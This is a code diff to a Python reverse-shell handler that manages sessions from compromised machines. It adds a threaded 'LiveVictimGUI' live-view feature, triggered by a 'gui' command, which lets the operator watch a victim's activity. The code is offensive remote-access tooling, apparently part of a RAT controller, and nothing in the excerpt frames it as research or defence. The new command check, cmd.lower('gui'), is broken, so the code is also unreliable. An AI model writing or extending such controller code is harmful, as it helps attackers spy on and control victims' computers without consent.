@@ -4,6 +4,17 @@ def reverse_shell():
     import sys
     import os
     import json
+    from LiveGUI import LiveVictimGUI
+    def start_live_view(client):
+        def run_gui():
+            try:
+                LiveVictimGUI(client)
+            except Exception as e:
+                print(f"error: {e}")
+            finally:
+                print("\nlive view stopped")
+        live_thread = threading.Thread(target=run_gui, daemon=True)
+        live_thread.start()
     HOST = '0.0.0.0'
     SESSION_FILE = "sessions.json"
     sessions = {}     
@@ -92,6 +103,9 @@ def reverse_shell():
                         print("[-] Not active")
                 except:
                     print("use <port>")
+            elif cmd.lower("gui"):
+                if active_port:
+                    start_live_view(sessions[active_port])
             elif cmd == "clear" or cmd == "cls":
                 os.system('cls' if os.name == 'nt' else 'clear')
             elif cmd == "sessions":
